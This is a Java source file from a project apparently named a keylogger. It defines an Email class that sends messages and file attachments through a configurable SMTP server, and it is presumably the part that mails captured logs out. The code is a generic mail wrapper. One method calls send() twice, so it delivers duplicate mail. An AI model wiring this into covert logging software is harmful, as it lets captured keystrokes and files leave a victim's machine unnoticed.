/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package br.com.juliansantos.JASKeylogger.email;

import java.io.File;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;
import org.apache.commons.mail.SimpleEmail;

/**
 *
 * @author Julian Santos
 */
public class Email {

    private String hostName;
    private int smtpPort;
    private String userName;
    private String password;
    private String from;
    private String to;
    private String subject;
    private String msg;
    private boolean sslOnConnect;
    private boolean tslOnConnect;

    /**
     * Sends e-mail using the <code>commons-email</code> library.
     *
     * @return the status of the sending, true to successfully sent message, if
     * any exception occurred, returns false.
     *
     * @throws org.apache.commons.mail.EmailException
     */
    public boolean sendMail() throws EmailException {

        SimpleEmail email = new SimpleEmail();
        boolean sent = false;

        email.setDebug(true);
        email.setHostName(hostName);
        email.setSmtpPort(smtpPort);
        email.setAuthentication(userName, password);
        email.setSSLOnConnect(sslOnConnect);
        email.setStartTLSEnabled(tslOnConnect);
        email.setFrom(from);
        email.addTo(to);
        email.setSubject(subject);
        email.setMsg(msg);
        sent = !email.send().isEmpty();

        return sent;
    }

    /**
     * Sends e-mail using the <code>commons-email</code> library.
     *
     * @param from
     * @param subject
     * @param msg
     * @param to
     *
     * @return the status of the sending, true to successfully sent message, if
     * any exception occurred, returns false.
     *
     * @throws org.apache.commons.mail.EmailException
     */
    public boolean sendMail(String from, String to, String subject, String msg) throws EmailException {

        SimpleEmail email = new SimpleEmail();
        boolean sent = false;

        email.setDebug(true);
        email.setHostName(hostName);
        email.setSmtpPort(smtpPort);
        email.setAuthentication(userName, password);
        email.setSSLOnConnect(sslOnConnect);
        email.setStartTLSEnabled(tslOnConnect);
        email.setFrom(from);
        email.addTo(to);
        email.setSubject(subject);
        email.setMsg(msg);
        sent = !email.send().isEmpty();

        return sent;
    }

    /**
     * Sends e-mail using the <code>commons-email</code> library.
     *
     * @param hostName
     * @param smtpPort
     * @param userName
     * @param password
     * @param sslOnConnect
     * @param tslOnConnect
     * @param from
     * @param subject
     * @param msg
     * @param to
     *
     * @return the status of the sending, true to successfully sent message, if
     * any exception occurred, returns false.
     *
     * @throws org.apache.commons.mail.EmailException
     */
    public boolean sendMail(String hostName, int smtpPort, String userName, String password, boolean sslOnConnect, boolean tslOnConnect, String from, String to, String subject, String msg) throws EmailException {

        SimpleEmail email = new SimpleEmail();
        boolean sent = false;

        email.setDebug(true);
        email.setHostName(hostName);
        email.setSmtpPort(smtpPort);
        email.setAuthentication(userName, password);
        email.setSSLOnConnect(sslOnConnect);
        email.setStartTLSEnabled(tslOnConnect);
        email.setFrom(from);
        email.addTo(to);
        email.setSubject(subject);
        email.setMsg(msg);
        email.send();
        sent = !email.send().isEmpty();

        return sent;
    }

    /**
     * Sends e-mail with attachment using the <code>commons-email</code>
     * library.
     *
     * @param attachmentFile
     *
     * @return the status of the sending, true to successfully sent message, if
     * any exception occurred, returns false.
     *
     * @throws org.apache.commons.mail.EmailException
     */
    public boolean sendMailWithAttachments(File attachmentFile) throws EmailException {

        Thread.currentThread().setContextClassLoader(getClass().getClassLoader());

        MultiPartEmail email = new MultiPartEmail();
        boolean sent = false;

        email.setDebug(true);
        email.setHostName(hostName);
        email.setSmtpPort(smtpPort);
        email.setAuthentication(userName, password);
        email.setSSLOnConnect(sslOnConnect);
        email.setStartTLSEnabled(tslOnConnect);
        email.setFrom(from);
        email.addTo(to);
        email.setSubject(subject);
        email.setMsg(msg);

        EmailAttachment attachment = new EmailAttachment();
        attachment.setPath(attachmentFile.getPath());
        attachment.setDisposition(EmailAttachment.ATTACHMENT);
        email.attach(attachment);

        sent = !email.send().isEmpty();

        return sent;
    }

    /**
     * Sends e-mail with attachment using the <code>commons-email</code>
     * library.
     *
     * @param attachmentFiles
     *
     * @return the status of the sending, true to successfully sent message, if
     * any exception occurred, returns false.
     *
     * @throws org.apache.commons.mail.EmailException
     */
    public boolean sendMailWithAttachments(ArrayList<String> attachmentFiles) throws EmailException {

        Thread.currentThread().setContextClassLoader(getClass().getClassLoader());

        MultiPartEmail email = new MultiPartEmail();
        boolean sent = false;

        email.setDebug(true);
        email.setHostName(hostName);
        email.setSmtpPort(smtpPort);
        email.setAuthentication(userName, password);
        email.setSSLOnConnect(sslOnConnect);
        email.setStartTLSEnabled(tslOnConnect);
        email.setFrom(from);
        email.addTo(to);
        email.setSubject(subject);
        email.setMsg(msg);

        for (String file : attachmentFiles) {
            EmailAttachment attachment = new EmailAttachment();
            attachment.setPath(file);
            attachment.setDisposition(EmailAttachment.ATTACHMENT);
            email.attach(attachment);
        }

        sent = !email.send().isEmpty();

        return sent;
    }

    /**
     * Sends e-mail with attachment using the <code>commons-email</code>
     * library.
     *
     * @param from
     * @param to
     * @param subject
     * @param msg
     * @param attachmentFiles
     *
     * @return the status of the sending, true to successfully sent message, if
     * any exception occurred, returns false.
     *
     * @throws org.apache.commons.mail.EmailException
     */
    public boolean sendMailWithAttachments(String from, String to, String subject, String msg, ArrayList<String> attachmentFiles) throws EmailException {

        Thread.currentThread().setContextClassLoader(getClass().getClassLoader());

        MultiPartEmail email = new MultiPartEmail();
        boolean sent = false;

        try {
            email.setDebug(true);
            email.setHostName(hostName);
            email.setSmtpPort(smtpPort);
            email.setAuthentication(userName, password);
            email.setSSLOnConnect(sslOnConnect);
            email.setStartTLSEnabled(tslOnConnect);
            email.setFrom(from);
            email.addTo(to);
            email.setSubject(subject);
            email.setMsg(msg);
            for (String file : attachmentFiles) {
                EmailAttachment attachment = new EmailAttachment();
                attachment.setPath(file);
                attachment.setDisposition(EmailAttachment.ATTACHMENT);
                email.attach(attachment);
            }
            email.send();
            sent = true;
        } catch (EmailException ex) {
            Logger.getLogger(Email.class.getName()).log(Level.SEVERE, null, ex);
            JOptionPane.showMessageDialog(null, ex.getMessage(), this.getClass().getName(), JOptionPane.ERROR_MESSAGE);
        }

        return sent;
    }

    /**
     * Sends e-mail with attachment using the <code>commons-email</code>
     * library.
     *
     * @param hostName
     * @param smtpPort
     * @param userName
     * @param password
     * @param sslOnConnect
     * @param tslOnConnect
     * @param from
     * @param to
     * @param subject
     * @param msg
     * @param attachmentFiles
     *
     * @return the status of the sending, true to successfully sent message, if
     * any exception occurred, returns false.
     *
     * @throws org.apache.commons.mail.EmailException
     */
    public boolean sendMailWithAttachments(String hostName, int smtpPort, String userName, String password, boolean sslOnConnect, boolean tslOnConnect, String from, String to, String subject, String msg, ArrayList<String> attachmentFiles) throws EmailException {

        Thread.currentThread().setContextClassLoader(getClass().getClassLoader());

        MultiPartEmail email = new MultiPartEmail();
        boolean sent = false;

        email.setDebug(true);
        email.setHostName(hostName);
        email.setSmtpPort(smtpPort);
        email.setAuthentication(userName, password);
        email.setSSLOnConnect(sslOnConnect);
        email.setStartTLSEnabled(tslOnConnect);
        email.setFrom(from);
        email.addTo(to);
        email.setSubject(subject);
        email.setMsg(msg);
        for (String file : attachmentFiles) {
            EmailAttachment attachment = new EmailAttachment();
            attachment.setPath(file);
            attachment.setDisposition(EmailAttachment.ATTACHMENT);
            email.attach(attachment);
        }
        email.send();
        sent = true;

        return sent;
    }

    // Getters and Setters.
    // ------------------------------------------------------------------------
    
    /**
     * Gets the host name of the SMTP server.
     * @return host name.
     */
    public String getHostName() {
        return hostName;
    }
    
    /**
     * 
     * @param hostName 
     */
    public void setHostName(String hostName) {
        this.hostName = hostName;
    }
    
    /**
     * Gets the listening port of the SMTP server.
     * @return smtp port.
     */
    public int getSmtpPort() {
        return smtpPort;
    }
    
    /**
     * 
     * @param smtpPort 
     */
    public void setSmtpPort(int smtpPort) {
        this.smtpPort = smtpPort;
    }
    
    /**
     * Gets user name for authentication in smtp server.
     * @return user name.
     */
    public String getUserName() {
        return userName;
    }
    
    /**
     * 
     * @param userName 
     */
    public void setUserName(String userName) {
        this.userName = userName;
    }
    
    /**
     * Gets the password for authentication in smtp server.
     * @return password.
     */
    public String getPassword() {
        return password;
    }
    
    /**
     * 
     * @param password 
     */
    public void setPassword(String password) {
        this.password = password;
    }
    
    /**
     * Gets the sender of the email.
     * @return sender of the email.
     */
    public String getFrom() {
        return from;
    }
    
    /**
     * 
     * @param from 
     */
    public void setFrom(String from) {
        this.from = from;
    }
    
    /**
     * Get the list of "To" addresses.
     * @return "To" addresses.
     */
    public String getTo() {
        return to;
    }
    
    /**
     * 
     * @param to 
     */
    public void setTo(String to) {
        this.to = to;
    }
    
    /**
     * Gets the subject of the email.
     * @return subject of the email.
     */
    public String getSubject() {
        return subject;
    }
    
    /**
     * 
     * @param subject 
     */
    public void setSubject(String subject) {
        this.subject = subject;
    }
    
    /**
     * Returns the Message.
     * @return body of the email.
     */
    public String getMsg() {
        return msg;
    }
    
    /**
     * 
     * @param msg 
     */
    public void setMsg(String msg) {
        this.msg = msg;
    }
    
    /**
     * Returns whether SSL/TLS encryption for the transport is currently enabled (SMTPS/POPS).
     * @return true if SSL enabled for the transport.
     */
    public boolean isSslOnConnect() {
        return sslOnConnect;
    }
    
    /**
     * 
     * @param sslOnConnect 
     */
    public void setSslOnConnect(boolean sslOnConnect) {
        this.sslOnConnect = sslOnConnect;
    }
    
    /**
     * Gets whether the client is configured to try to enable STARTTLS.
     * @return true if SSL enabled.
     */
    public boolean isTslOnConnect() {
        return tslOnConnect;
    }
    
    /**
     * 
     * @param tslOnConnect 
     */
    public void setTslOnConnect(boolean tslOnConnect) {
        this.tslOnConnect = tslOnConnect;
    }

}
